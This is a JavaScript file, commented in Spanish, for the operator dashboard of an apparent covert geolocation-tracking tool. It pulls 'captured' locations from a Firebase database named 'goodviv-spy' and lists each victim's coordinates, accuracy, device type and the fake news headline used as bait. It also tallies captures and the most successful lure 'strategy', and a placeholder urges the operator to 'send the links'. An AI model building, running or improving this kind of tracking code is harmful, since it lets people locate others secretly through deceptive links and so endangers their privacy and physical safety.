// Script para integrar base de datos compartida en el centro de control
function initSharedDatabase() {
    // Sobrescribir función refreshCaptures para usar base de datos compartida
    window.originalRefreshCaptures = window.refreshCaptures;
    
    window.refreshCaptures = function() {
        const container = document.getElementById('capturedList');
        container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">🔄 Cargando ubicaciones compartidas...</p>';
        
        // Cargar desde Firebase
        fetch('https://goodviv-spy-default-rtdb.firebaseio.com/locations.json', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            },
            cache: 'no-store' // Deshabilitar caché para obtener siempre datos frescos
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error de red: ' + response.status);
            }
            return response.json();
        })
        .then(data => {
            // Convertir el objeto de Firebase en un array y filtrar valores nulos
            const sharedLocations = data ? Object.values(data).filter(item => item !== null) : [];
            console.log('🔥 Datos de Firebase:', sharedLocations.length);
            
            const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
            console.log('💻 Datos locales:', localLocations.length);
            
            // Combinar y eliminar duplicados
            const allLocations = [...sharedLocations, ...localLocations];
            const uniqueLocations = allLocations.filter((location, index, self) => 
                index === self.findIndex(l => l.id === location.id)
            );
            
            // Ordenar por timestamp más reciente
            uniqueLocations.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            console.log('📍 Ubicaciones compartidas encontradas:', uniqueLocations.length);
            
            if (uniqueLocations.length === 0) {
                container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">No hay capturas aún... ¡Envía los enlaces!</p>';
                return;
            }
            
            container.innerHTML = uniqueLocations.map(location => `
                <div class="location-item">
                    <div class="location-header">🎯 ${location.source || 'Fuente desconocida'}</div>
                    <div class="location-details">
                        📍 <strong>Coordenadas:</strong> ${location.lat ? location.lat.toFixed(6) : 'N/A'}, ${location.lng ? location.lng.toFixed(6) : 'N/A'}<br>
                        🎯 <strong>Precisión:</strong> ±${Math.round(location.accuracy || 0)}m<br>
                        ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
                        🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}<br>
                        ${location.newsTitle ? `📰 <strong>Noticia:</strong> ${location.newsTitle.substring(0, 50)}...` : ''}
                        <div style="margin-top: 10px;">
                            <button onclick="openInGoogleMaps(${location.lat || 0}, ${location.lng || 0})" style="background: #3498db; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-right: 5px; font-size: 0.8rem;">
                                🗺️ Ver en Mapa
                            </button>
                            <button onclick="copyToClipboard('${location.lat ? location.lat.toFixed(6) : '0'}, ${location.lng ? location.lng.toFixed(6) : '0'}')" style="background: #27ae60; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 0.8rem;">
                                📋 Copiar Coordenadas
                            </button>
                        </div>
                    </div>
                </div>
            `).join('');
            
            // Actualizar estadísticas con datos compartidos
            updateStatsWithSharedData(uniqueLocations);
        })
        .catch(error => {
            console.error('Error cargando base de datos compartida:', error);
            container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 20px;">❌ Error cargando ubicaciones compartidas. Usando datos locales...</p>';
            // Usar función original si falla
            if (window.originalRefreshCaptures) {
                window.originalRefreshCaptures();
            }
        });
    };
    
    // Función para actualizar estadísticas con datos compartidos
    window.updateStatsWithSharedData = function(locations) {
        // Total capturas
        document.getElementById('totalCaptures').textContent = locations.length;
        
        // Capturas hoy
        const today = new Date().toDateString();
        const todayCaptures = locations.filter(loc => 
            new Date(loc.timestamp).toDateString() === today
        ).length;
        document.getElementById('todayCaptures').textContent = todayCaptures;
        
        // Precisión promedio
        if (locations.length > 0) {
            const avgAccuracy = locations.reduce((sum, loc) => sum + (loc.accuracy || 0), 0) / locations.length;
            document.getElementById('averageAccuracy').textContent = Math.round(avgAccuracy) + 'm';
        }
        
        // Mejor estrategia
        const strategies = {};
        locations.forEach(loc => {
            strategies[loc.source] = (strategies[loc.source] || 0) + 1;
        });
        
        const bestStrategy = Object.keys(strategies).reduce((a, b) => 
            strategies[a] > strategies[b] ? a : b, '-'
        );
        
        const shortName = {
            'Diario Regional - Noticias': '📰 Noticias',
            'news': '📰 Noticias'
        };
        
        document.getElementById('bestStrategy').textContent = shortName[bestStrategy] || '-';
    };
}

// Inicializar cuando se carga la página
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initSharedDatabase);
} else {
    initSharedDatabase();
}